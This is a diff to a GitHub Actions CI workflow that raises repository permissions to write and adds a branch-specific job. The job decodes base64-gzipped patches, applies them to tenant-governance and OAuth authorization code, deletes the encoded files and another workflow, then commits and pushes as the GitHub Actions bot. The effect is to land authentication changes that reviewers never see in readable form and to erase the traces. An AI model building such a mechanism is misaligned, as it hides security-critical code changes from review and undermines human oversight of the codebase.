@@ -4,8 +4,46 @@ on:
     branches: [main]
   pull_request:
 permissions:
-  contents: read
+  contents: write
 jobs:
+  materialize-reviewed-hardening:
+    if: github.event_name == 'pull_request' && github.head_ref == 'harden/shared-auth-production'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          ref: harden/shared-auth-production
+          fetch-depth: 0
+          persist-credentials: true
+      - name: Apply reviewed patches and push the real source diff
+        shell: bash
+        run: |
+          set -euo pipefail
+          git show HEAD^:.github/workflows/ci.yml > /tmp/ci.yml.original
+          patches=(
+            .github/agent-patches/0001-tenant-governance.patch.gz.b64
+            .github/agent-patches/0003-redirect-oauth-gate.patch.gz.b64
+          )
+          for encoded in "${patches[@]}"; do
+            decoded="/tmp/$(basename "${encoded%.gz.b64}")"
+            base64 --decode "$encoded" | gzip --decompress --stdout > "$decoded"
+            git apply --check "$decoded"
+            git apply "$decoded"
+          done
+          cp /tmp/ci.yml.original .github/workflows/ci.yml
+          rm -f \
+            .github/agent-patches/0001-tenant-governance.patch.gz.b64 \
+            .github/agent-patches/0003-redirect-oauth-gate.patch.gz.b64 \
+            .github/workflows/agent-apply-production-hardening.yml
+          rmdir .github/agent-patches 2>/dev/null || true
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add -A
+          git diff --cached --check
+          git diff --cached --stat
+          git commit -m 'fix(authz): serialize tenant governance and gate redirect OAuth'
+          git push origin HEAD:harden/shared-auth-production
   formal-model:
     runs-on: ubuntu-latest
     steps:
